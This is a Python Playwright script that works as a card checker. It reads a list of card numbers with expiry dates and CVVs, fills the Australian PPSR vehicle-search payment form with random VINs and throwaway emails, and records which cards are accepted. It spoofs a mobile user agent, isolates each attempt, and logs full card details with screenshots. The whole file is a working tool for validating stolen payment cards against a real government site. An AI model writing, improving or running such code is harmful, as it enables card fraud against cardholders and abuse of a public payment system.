import asyncio
import os
import random
import string
import sys
from playwright.async_api import async_playwright
from gen_vin import generate_vin
from update_widget import update_widget_data
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel

console = Console()

async def process_card(page, card_data, status_live):
    parts = card_data.split('|')
    if len(parts) < 4:
        return "SKIP"
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    
    def update_status(step, detail=""):
        table = Table(show_header=False, box=None)
        table.add_row(f"[bold cyan]Card:[/bold cyan] {cc}|{mm}|{yy}|{cvv}")
        table.add_row(f"[bold yellow]Step:[/bold yellow] {step}")
        if detail:
            table.add_row(f"[bold blue]Info:[/bold blue] {detail}")
        status_live.update(Panel(table, title="[bold green]Live Processing Analysis[/bold green]", border_style="bright_blue"))

    update_status("Starting navigation", "Navigating to PPSR search page...")
    
    try:
        # 1. Navigate to PPSR search page
        await page.goto('https://transact.ppsr.gov.au/ppsr-mobile/QMVS', wait_until="networkidle")
        
        # Check if there's a "Continue" button (Important message page)
        update_status("Handling landing page", "Checking for 'Continue' button...")
        continue_btn = page.get_by_role('button', name='Continue')
        if await continue_btn.is_visible():
            await continue_btn.click()
            await page.wait_for_load_state("networkidle")
            
        # 2. Fill search form
        vin = generate_vin()
        email = f"user_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}@outlook.com"
        
        update_status("Filling search form", f"VIN: {vin}\nEmail: {email}")
        
        # Explicitly wait for the textbox to be ready
        vin_field = page.get_by_role('textbox', name='VIN/Chassis number:')
        await vin_field.wait_for(state="visible", timeout=10000)
        await vin_field.fill(vin)
        await page.get_by_role('textbox', name='E-mail:').fill(email)
        
        update_status("Submitting search", "Clicking 'Proceed to Payment'...")
        await page.get_by_role('button', name='Proceed to Payment').click()
        
        # 3. Fill payment form
        update_status("Filling payment details", "Waiting for payment form...")
        
        card_number_field = page.get_by_role('textbox', name='Card number:')
        try:
            await card_number_field.wait_for(state="visible", timeout=15000)
        except Exception:
            page_text = await page.evaluate('() => document.body.innerText')
            if "An error has occurred" in page_text:
                update_status("Error", "System error before payment form")
                screenshot_path = f"../screenshots/error_prepayment_{cc[-4:]}.png"
                await page.screenshot(path=screenshot_path)
                status = "ERROR_PREPAYMENT"
                results_path = "../results.txt" if os.path.basename(os.getcwd()) == "runner" else "results.txt"
                with open(results_path, "a") as f:
                    f.write(f"{cc}|{mm}|{yy}|{cvv}|{status}|{screenshot_path}\n")
                return status
            raise

        update_status("Filling payment details", "Entering credit card information...")
        await card_number_field.fill(cc)
        await page.get_by_role('textbox', name='Expiry month:').fill(mm)
        await page.get_by_role('textbox', name='Expiry year:').fill(yy)
        await page.get_by_role('textbox', name='CSC:').fill(cvv)
        
        # 4. Click Pay now
        update_status("Finalizing payment", "Clicking 'Pay now'...")
        await page.get_by_role('button', name='Pay now').click()
        
        # 5. Wait for result and capture
        update_status("Processing", "Waiting 8 seconds for transaction results...")
        await asyncio.sleep(8) # Wait for processing
        
        # Analysis
        update_status("Analysis", "Capturing page data...")
        page_text = await page.evaluate('() => document.body.innerText')
        
        fail_texts = ["An error has occurred", "transaction declined", "payment failed", "invalid card", "insufficient funds"]
        status = "SUCCESS"
        color = "green"
        
        for ft in fail_texts:
            if ft.lower() in page_text.lower():
                status = "FAIL"
                color = "red"
                break
        
        error_dialog = page.get_by_role("heading", name="Error")
        if await error_dialog.is_visible():
            status = "FAIL"
            color = "red"

        screenshot_path = f"../screenshots/result_{cc[-4:]}.png"
        update_status("Saving result", f"Status: [{color}]{status}[/{color}]\nSaving screenshot to {screenshot_path}")
        await page.screenshot(path=screenshot_path)
        
        results_path = "../results.txt" if os.path.basename(os.getcwd()) == "runner" else "results.txt"
        with open(results_path, "a") as f:
            f.write(f"{cc}|{mm}|{yy}|{cvv}|{status}|{screenshot_path}\n")
            
        return status
            
    except Exception as e:
        update_status("Error", f"[bold red]{str(e)}[/bold red]")
        error_cc = cc if 'cc' in locals() else "unknown"
        await page.screenshot(path=f"../screenshots/crash_{error_cc[-4:]}.png")
        return f"ERROR: {str(e)}"

async def main():
    creds_file = sys.argv[1] if len(sys.argv) > 1 else '../cards.txt'
    
    if not os.path.exists(creds_file):
        console.print(f"[bold red]File not found:[/bold red] {creds_file}")
        return
        
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        
        with Live(auto_refresh=True) as live:
            while True:
                with open(creds_file, 'r') as f:
                    cards = [line.strip() for line in f if line.strip()]
                
                if not cards:
                    break
                    
                current_card = cards[0]
                remaining_cards = cards[1:]
                
                # ISOLATION: New context/page per card
                context = await browser.new_context(
                    viewport={'width': 375, 'height': 667},
                    user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
                )
                page = await context.new_page()
                
                status = await process_card(page, current_card, live)
                
                await context.close() # Close context and page
                
                with open(creds_file, 'w') as f:
                    for card in remaining_cards:
                        f.write(card + '\n')
                
                if creds_file.startswith("../"):
                    update_widget_data(cards_file="../cards.txt", results_file="../results.txt", output_file="../widget_data.json")
                else:
                    update_widget_data(cards_file="cards.txt", results_file="results.txt", output_file="widget_data.json")
                
                console.print(f"[bold green]Processed:[/bold green] {current_card.split('|')[0][-4:]} -> {status}. [white]{len(remaining_cards)}[/white] left.")
                
                if len(remaining_cards) > 0:
                    await asyncio.sleep(2) # Stability delay
                else:
                    break
            
        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
